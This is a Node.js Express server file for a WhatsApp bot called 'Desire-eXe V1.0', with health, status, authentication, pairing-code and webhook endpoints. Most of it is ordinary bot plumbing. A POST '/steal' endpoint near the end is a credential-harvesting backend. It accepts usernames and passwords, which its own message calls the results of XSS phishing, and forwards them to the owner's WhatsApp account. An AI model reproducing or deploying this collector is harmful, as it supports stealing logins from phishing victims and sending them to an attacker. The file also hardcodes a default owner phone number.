const { startBot, getAuthPage, getQRCode, requestPairingCode } = require('./config/WhatsappConnection.js');
const express = require('express');
const bodyParser = require('body-parser');

// ✅ Express server setup
const app = express();
const port = process.env.PORT || 8000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Global variables to track bot state
global.botStatus = 'starting';
global.whatsappBot = null;
global.connectionTime = null;
global.totalPings = 0;

// ✅ UNIVERSAL PLATFORM DETECTION
const getPlatform = () => {
  if (process.env.KOYEB_APP_DOMAIN || process.env.KOYEB_REGION) return 'Koyeb';
  if (process.env.RENDER_SERVICE_ID || process.env.RENDER) return 'Render';
  if (process.env.RAILWAY_ENVIRONMENT) return 'Railway';
  if (process.env.HEROKU_APP_NAME) return 'Heroku';
  return process.env.PLATFORM || 'KataBump';
};

const PLATFORM = getPlatform();

// ✅ YOUR ENVIRONMENT VARIABLES
const CONFIG = {
  CLEAN_SESSION: process.env.CLEAN_SESSION === 'true',
  OWNER_JID: process.env.OWNER_JID || '2347017747337@s.whatsapp.net',
  WHATSAPP_NUMBER: process.env.WHATSAPP_NUMBER || '2347017747337'
};

// Helper function to get session information
function getSessionInfo() {
  const sock = global.whatsappBot;
  
  if (!sock) {
    return {
      connected: false,
      message: 'Bot not initialized'
    };
  }

  const creds = sock.authState?.creds || {};
  const sessionId = creds.me?.id;
  
  return {
    connected: global.botStatus === 'connected',
    hasSession: !!sessionId,
    registered: creds.registered || false,
    platform: sock.user?.platform || 'Unknown',
    sessionId: sessionId ? `${sessionId.substring(0, 8)}...` : 'Not authenticated',
    phone: creds.me?.phone ? `${creds.me.phone.substring(0, 4)}...` : null,
    connectionTime: global.connectionTime,
    cleanSession: CONFIG.CLEAN_SESSION
  };
}

// ==================== UNIVERSAL ENDPOINTS ====================

app.get('/', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { isConnected } = getQRCode();
  
  res.json({ 
    status: 'online', 
    bot: 'Desire-eXe V1.0',
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
      clean_session: CONFIG.CLEAN_SESSION
    },
    deployment: {
      platform: PLATFORM,
      node_version: process.version,
      uptime: process.uptime()
    },
    botStatus: global.botStatus,
    connected: isConnected,
    session: sessionInfo,
    timestamp: new Date().toISOString()
  });
});

app.get('/ping', (req, res) => {
  global.totalPings = (global.totalPings || 0) + 1;
  
  const sessionInfo = getSessionInfo();
  const { isConnected } = getQRCode();
  
  res.json({ 
    status: 'pong',
    bot: 'Desire-eXe V1.0',
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      clean_session: CONFIG.CLEAN_SESSION
    },
    botStatus: global.botStatus,
    connected: isConnected,
    session: sessionInfo,
    uptime: process.uptime(),
    total_pings: global.totalPings,
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'healthy',
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      clean_session: CONFIG.CLEAN_SESSION
    },
    uptime: process.uptime(),
    botStatus: global.botStatus,
    timestamp: new Date().toISOString()
  });
});

app.get('/status', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { isConnected } = getQRCode();
  
  res.json({
    status: 'online',
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
      clean_session: CONFIG.CLEAN_SESSION
    },
    botStatus: global.botStatus,
    connected: isConnected,
    session: sessionInfo,
    deployment: {
      platform: PLATFORM,
      port: port,
      environment: process.env.NODE_ENV || 'development'
    },
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// ==================== KATABUMP WEBHOOK ====================

app.post('/webhook', async (req, res) => {
  try {
    const { message, sender, chat, type } = req.body;
    
    console.log('📥 Incoming Webhook:', {
      from: sender?.phone || sender?.id,
      message: message?.text || message?.caption,
      type: type,
      platform: PLATFORM
    });

    if (!global.whatsappBot || global.botStatus !== 'connected') {
      return res.status(503).json({
        success: false,
        error: 'WhatsApp bot not connected',
        botStatus: global.botStatus,
        platform: PLATFORM
      });
    }

    if (type === 'text' && message?.text) {
      // Use your OWNER_JID from environment variables
      await global.whatsappBot.sendMessage(CONFIG.OWNER_JID, {
        text: `📨 *INCOMING MESSAGE*\n\n💬 Message: ${message.text}\n👤 From: ${sender?.phone || sender?.id}\n🖥️ Platform: ${PLATFORM}\n⏰ Time: ${new Date().toLocaleString()}`,
      });

      res.json({
        success: true,
        handled: true,
        message: 'Forwarded to WhatsApp',
        platform: PLATFORM,
        timestamp: new Date().toISOString()
      });
    } else {
      res.json({
        success: true,
        handled: false,
        message: 'Message type not processed',
        type: type,
        platform: PLATFORM
      });
    }

  } catch (error) {
    console.error('❌ Webhook error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error',
      platform: PLATFORM
    });
  }
});

// Webhook status endpoint
app.get('/webhook/status', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { isConnected } = getQRCode();
  
  res.json({
    success: true,
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      clean_session: CONFIG.CLEAN_SESSION
    },
    bot_status: global.botStatus,
    whatsapp_connected: isConnected,
    webhook_endpoint: '/webhook',
    session: sessionInfo,
    deployment: {
      platform: PLATFORM,
      webhook_ready: true,
      supported_platforms: ['Koyeb', 'Render', 'KataBump']
    },
    timestamp: new Date().toISOString()
  });
});

// ==================== AUTHENTICATION ENDPOINTS ====================

app.get('/auth', (req, res) => {
  res.send(getAuthPage());
});

app.post('/auth/pairing', async (req, res) => {
  const { phoneNumber } = req.body;
  
  if (!phoneNumber) {
    return res.status(400).json({
      success: false,
      error: 'Phone number is required'
    });
  }
  
  if (!global.whatsappBot) {
    return res.status(503).json({
      success: false,
      error: 'WhatsApp bot not ready. Please try again in a few seconds.'
    });
  }
  
  try {
    const result = await requestPairingCode(global.whatsappBot, phoneNumber);
    
    if (result.success) {
      res.json({
        success: true,
        code: result.code,
        phoneNumber: result.phoneNumber,
        expiresAt: result.expiresAt,
        message: 'Pairing code generated successfully',
        platform: PLATFORM,
        config: {
          clean_session: CONFIG.CLEAN_SESSION
        }
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error
      });
    }
  } catch (error) {
    console.error('❌ Pairing code request error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to generate pairing code: ' + error.message
    });
  }
});

app.get('/auth/status', (req, res) => {
  const { qrCode, qrCodeImage, isConnected, pairingCode, pairingPhoneNumber } = getQRCode();
  const sessionInfo = getSessionInfo();
  
  res.json({
    success: true,
    connected: isConnected,
    botStatus: global.botStatus,
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      clean_session: CONFIG.CLEAN_SESSION
    },
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode,
      pairingPhoneNumber: pairingPhoneNumber,
      pairingCode: pairingCode ? '••••••' : null
    },
    session: sessionInfo,
    timestamp: new Date().toISOString()
  });
});

// ==================== MONITORING ENDPOINTS ====================

app.get('/monitor', (req, res) => {
  const { isConnected } = getQRCode();
  
  const status = (global.botStatus === 'connected' && isConnected) ? 'healthy' : 'warning';
  
  res.json({
    status: status,
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      clean_session: CONFIG.CLEAN_SESSION
    },
    bot_status: global.botStatus,
    connected: isConnected,
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

app.get('/live', (req, res) => {
  res.json({ 
    alive: true, 
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      clean_session: CONFIG.CLEAN_SESSION
    },
    bot: global.botStatus,
    connected: getQRCode().isConnected,
    time: new Date().toISOString()
  });
});

// ==================== BOT MANAGEMENT ====================

app.get('/session', (req, res) => {
  const sessionInfo = getSessionInfo();
  
  res.json({
    success: true,
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
      clean_session: CONFIG.CLEAN_SESSION
    },
    botStatus: global.botStatus,
    session: sessionInfo,
    connectionTime: global.connectionTime,
    timestamp: new Date().toISOString()
  });
});

app.get('/bot/info', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { qrCode, pairingCode } = getQRCode();
  
  res.json({
    name: 'Desire-eXe V1.0',
    version: '1.0.0',
    platform: PLATFORM,
    config: {
      owner: CONFIG.OWNER_JID,
      whatsapp_number: CONFIG.WHATSAPP_NUMBER,
      clean_session: CONFIG.CLEAN_SESSION
    },
    status: global.botStatus,
    session: sessionInfo,
    deployment: {
      current: PLATFORM,
      supported: ['Koyeb', 'Render', 'KataBump'],
      node_version: process.version
    },
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode
    },
    endpoints: {
      health: '/health',
      status: '/status',
      auth: '/auth',
      session: '/session',
      webhook: '/webhook',
      ping: '/ping',
      monitor: '/monitor'
    },
    timestamp: new Date().toISOString()
  });
});

// Your existing /steal endpoint - Updated to use CONFIG.OWNER_JID
app.post('/steal', async (req, res) => {
  const { username, password } = req.body;

  try {
    if (global.whatsappBot && global.botStatus === 'connected') {
      await global.whatsappBot.sendMessage(CONFIG.OWNER_JID, {
        text: `🕷 *XSS PHISHING DETECTED!* \n\n👤 Username: ${username}\n🔑 Password: ${password}\n🖥️ Platform: ${PLATFORM}\n⏰ Time: ${new Date().toLocaleString()}`,
      });
      res.json({
        success: true,
        message: 'Credentials sent to WhatsApp',
        platform: PLATFORM,
        config: {
          owner: CONFIG.OWNER_JID,
          clean_session: CONFIG.CLEAN_SESSION
        },
        timestamp: new Date().toISOString()
      });
    } else {
      res.status(503).json({ 
        success: false,
        error: 'WhatsApp bot not ready',
        botStatus: global.botStatus,
        platform: PLATFORM,
        config: {
          owner: CONFIG.OWNER_JID
        }
      });
    }
  } catch (err) {
    console.error('❌ Error sending credentials to WhatsApp:', err.message);
    res.status(500).json({ 
      success: false,
      error: 'Failed to send message',
      botStatus: global.botStatus,
      platform: PLATFORM,
      config: {
        owner: CONFIG.OWNER_JID
      }
    });
  }
});

// ==================== APP INITIALIZATION ====================

async function initializeApp() {
  try {
    console.log('🚀 Starting Desire-eXe V1.0...');
    console.log(`🌐 Platform: ${PLATFORM}`);
    console.log(`🔧 Node.js: ${process.version}`);
    
    // Log your environment configuration
    console.log(`⚙️  Configuration:`);
    console.log(`   📞 Owner JID: ${CONFIG.OWNER_JID}`);
    console.log(`   📱 WhatsApp: ${CONFIG.WHATSAPP_NUMBER}`);
    console.log(`   🧹 Clean Session: ${CONFIG.CLEAN_SESSION}`);
    console.log(`   🔧 Platform: ${PLATFORM}`);
    
    // Platform-specific initialization messages
    switch(PLATFORM) {
      case 'Koyeb':
        console.log('🐳 Running on Koyeb with Alpine Linux + FFmpeg');
        break;
      case 'Render':
        console.log('🎨 Running on Render with Free Plan');
        break;
      case 'KataBump':
        console.log('⚡ Running on KataBump');
        console.log('🌐 Webhook ready at: /webhook');
        break;
      default:
        console.log('💻 Running on custom platform');
    }
    
    // Start WhatsApp bot
    const sock = await startBot();
    global.whatsappBot = sock;
    
    console.log('✅ WhatsApp bot initialization complete');
    
    // Start Express server
    const server = app.listen(port, () => {
      console.log(`🚀 Express server running on port ${port}`);
      console.log(`🤖 Bot Status: ${global.botStatus}`);
      console.log(`🌐 Health Check: /health`);
      console.log(`🔐 Authentication: /auth`);
      console.log(`🎯 Webhook Endpoint: /webhook`);
      console.log(`📊 Status: /status`);
      
      if (PLATFORM === 'KataBump') {
        console.log('\n💡 KataBump Setup:');
        console.log('📍 Set webhook URL to: [your-domain]/webhook');
        console.log('📍 Check status at: /webhook/status');
      }
    });

    // Graceful shutdown for all platforms
    process.on('SIGTERM', () => {
      console.log(`👋 ${PLATFORM} is stopping the service...`);
      global.botStatus = 'shutting_down';
      server.close(() => {
        console.log('✅ Express server closed gracefully');
        process.exit(0);
      });
    });

    process.on('SIGINT', () => {
      console.log('👋 Process interrupted...');
      global.botStatus = 'shutting_down';
      server.close(() => {
        console.log('✅ Express server closed');
        process.exit(0);
      });
    });

  } catch (err) {
    console.error('❌ Failed to start bot:', err);
    global.botStatus = 'failed';
    
    // Auto-restart with platform-specific delay
    const restartDelay = PLATFORM === 'Render' ? 30000 : 10000;
    console.log(`🔄 Auto-restarting in ${restartDelay/1000} seconds...`);
    setTimeout(initializeApp, restartDelay);
  }
}

// Start the application
initializeApp();

// Error handling
process.on('uncaughtException', (error) => {
  console.error('🔄 Uncaught Exception:', error.message);
  global.botStatus = 'error';
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🔄 Unhandled Rejection:', reason);
  global.botStatus = 'error';
});

// WhatsApp keep-alive
setInterval(async () => {
  if (global.whatsappBot && global.botStatus === 'connected') {
    try {
      await global.whatsappBot.sendPresenceUpdate('available');
      console.log('❤️ Keep-alive ping sent to WhatsApp');
    } catch (error) {
      console.log('⚠️ Keep-alive failed:', error.message);
      global.botStatus = 'error';
    }
  }
}, 4 * 60 * 1000);

// Platform status logging
setInterval(() => {
  if (global.botStatus) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    console.log(`📊 [${PLATFORM}] Status: ${global.botStatus}, Uptime: ${hours}h ${minutes}m, Clean Session: ${CONFIG.CLEAN_SESSION}`);
  }
}, 60000);

console.log('🔄 app.js loaded - Universal deployment ready!');
console.log(`✅ Using your environment variables: CLEAN_SESSION, OWNER_JID, WHATSAPP_NUMBER`);

